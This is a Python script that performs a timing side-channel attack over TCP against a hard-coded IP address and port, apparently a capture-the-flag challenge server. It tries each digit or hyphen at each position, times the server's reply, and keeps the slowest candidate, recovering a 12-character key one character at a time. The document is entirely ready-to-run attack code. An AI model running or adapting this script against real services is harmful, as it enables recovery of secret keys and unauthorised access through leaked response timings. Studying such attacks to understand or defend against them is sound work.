import socket
import time

class TimingAttaque:
  
  def __init__( self, target_ip, target_port ):
    self.target_ip = target_ip
    self.target_port = target_port
    self.buffer_size = 4096

    self.caracteres = '0123456789-'

    self.key = ''
    self.char_found = ''
    self.min_time = 0
    self.data = ''

    self.create_socket()

  def prepare_key_to_send( self, letter ):
    return ( self.key + letter ).encode( 'utf-8' )
  
  def create_socket( self ):
    self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.client.connect( (self.target_ip, self.target_port) )
    data = self.client.recv(self.buffer_size)
    print (data)
  
  def test_single_chars( self, letter ):

      self.client.sendall( self.prepare_key_to_send( letter ) )
      debut = time.time()
      self.data = self.client.recv( self.buffer_size )
      fin = time.time()
      diff = fin - debut
      if( diff > self.min_time ):
        self.min_time = diff
        print( "Diff: %d" %(diff) )
        print( "self.min_time: %f" %(self.min_time) )
        self.char_found = letter
      
  
  def test_global_key( self ):
    for i in range(12):
      for letter in self.caracteres: 
        self.test_single_chars( letter )
      self.key += self.char_found
      self.min_time = 0
      print("key: {}".format(self.key))
    
    self.client.close()


# attaque = TimingAttaque( "212.129.38.224", 51015 )
attaque = TimingAttaque( "212.129.38.224", 51035 )
attaque.test_global_key()



      
